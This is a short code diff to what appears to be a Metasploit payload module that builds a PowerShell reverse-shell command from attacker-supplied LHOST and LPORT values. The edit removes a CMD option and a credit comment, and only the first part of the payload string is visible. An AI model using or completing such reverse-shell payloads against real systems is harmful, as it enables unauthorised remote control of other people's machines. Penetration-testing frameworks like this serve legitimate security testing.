@@ -31,11 +31,6 @@ module Metasploit3
           'Payload' => ''
         }
       ))
-
-    register_options(
-      [
-        OptString.new('CMD', [ false, "The command string to execute" ]),
-      ], self.class)
   end
 
   #
@@ -49,7 +44,6 @@ module Metasploit3
   # Returns the command string to use for execution
   #
   def command_string
-    # Credit to: http://pastebin.com/dPPuTDKY
     lhost = datastore['LHOST']
     lport = datastore['LPORT']
     powershell = "function RSC{"\
